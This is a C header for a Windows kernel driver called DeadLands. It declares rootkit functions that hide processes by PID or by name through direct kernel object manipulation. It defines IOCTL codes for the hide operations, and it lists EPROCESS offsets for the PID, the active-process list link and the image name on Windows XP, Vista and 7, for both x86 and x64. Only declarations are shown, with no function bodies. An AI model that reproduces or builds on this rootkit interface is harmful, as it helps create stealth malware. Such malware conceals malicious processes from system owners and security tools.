#ifndef DEADLANDS_H_
# define DEADLANDS_H_
/*
**	Function codes 0-2047 are reserved for Microsoft. 
**	A function code can be no larger then 4095 !
*/
# define	SIOCTL_TYPE				40000
# define	FILE_DEVICE_DEADLANDS	(0x00002A7B)
# define	IOCTL_DEADLANDS_HIDE_PID	CTL_CODE(SIOCTL_TYPE, 0x800, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)
# define	IOCTL_DEADLANDS_HIDE_NAME	CTL_CODE(SIOCTL_TYPE, 0x801, METHOD_BUFFERED, FILE_READ_DATA|FILE_WRITE_DATA)

# if defined(_NT_TARGET_VERSION_WINXP)
#  if defined (_M_IX86)
#   define	EPROCESS_OFFSET_PID			0x084
#   define	EPROCESS_OFFSET_ELIST		0x088
#   define	EPROCESS_OFFSET_IMAGENAME	0x174
#  elif defined (_M_X64)
#   define	EPROCESS_OFFSET_PID			0x0D8
#   define	EPROCESS_OFFSET_ELIST		0x0E0
#   define	EPROCESS_OFFSET_IMAGENAME	0x268
#  endif
# elif defined (_NT_TARGET_VERSION_VISTA)
#  if defined (_M_IX86)
#   define	EPROCESS_OFFSET_PID			0x09C
#   define	EPROCESS_OFFSET_ELIST		0x0A0
#   define	EPROCESS_OFFSET_IMAGENAME	0x14C
#  elif defined (_M_X64)
#   define	EPROCESS_OFFSET_PID			0x0E0
#   define	EPROCESS_OFFSET_ELIST		0x0E8
#   define	EPROCESS_OFFSET_IMAGENAME	0x238
#  endif
# elif defined(_NT_TARGET_VERSION_SEVEN)
#  if defined (_M_IX86)
#   define	EPROCESS_OFFSET_PID			0x0B4
#   define	EPROCESS_OFFSET_ELIST		0x0B8
#   define	EPROCESS_OFFSET_IMAGENAME	0x16C
#  elif defined (_M_X64)
#   define	EPROCESS_OFFSET_PID			0x180
#   define	EPROCESS_OFFSET_ELIST		0x188
#   define	EPROCESS_OFFSET_IMAGENAME	0x2E0
#  endif
# endif

DRIVER_INITIALIZE	DriverEntry;
DRIVER_UNLOAD		CleanUp;
DRIVER_DISPATCH		DeadLands_NotImplemented;
__drv_dispatchType	(IRP_MJ_DEVICE_CONTROL)	DRIVER_DISPATCH		DeadLands_IOCTL;
__drv_dispatchType	(IRP_MJ_CREATE)			DRIVER_DISPATCH		DeadLands_Open;
__drv_dispatchType	(IRP_MJ_CLOSE)			DRIVER_DISPATCH		DeadLands_Close;
__drv_dispatchType	(IRP_MJ_READ)			DRIVER_DISPATCH		DeadLands_Read;
__drv_dispatchType	(IRP_MJ_WRITE)			DRIVER_DISPATCH		DeadLands_Write;

NTSTATUS	DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pRegistryPath);
NTSTATUS	DeadLands_NotImplemented(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
NTSTATUS	DeadLands_Open(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	DeadLands_Close(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	DeadLands_Read(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	DeadLands_Write(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS	DeadLands_IOCTL(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
void		CleanUp(IN PDRIVER_OBJECT pDriverObject);

PEPROCESS	DKOM_SearchProcessByPID(IN long pid);
PEPROCESS	DKOM_SearchProcessByName(IN char* procName, IN int lenName);
NTSTATUS	DKOM_HideProcessByName(IN char* procName, IN int lenName);
NTSTATUS	DKOM_HideProcessByPID(IN long procPID);

#endif
